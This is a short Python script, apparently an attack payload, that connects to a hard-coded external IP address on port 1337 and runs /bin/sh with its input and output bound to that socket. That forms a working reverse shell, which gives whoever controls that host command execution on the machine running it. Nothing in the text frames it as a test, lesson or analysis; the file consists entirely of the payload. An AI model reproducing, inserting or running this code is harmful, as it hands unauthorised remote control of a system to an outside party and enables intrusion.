import socket
from subprocess import *
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('35.189.75.139', 1337))
run('/bin/sh', stdin=sock, stdout=sock, stderr=sock, shell=True)
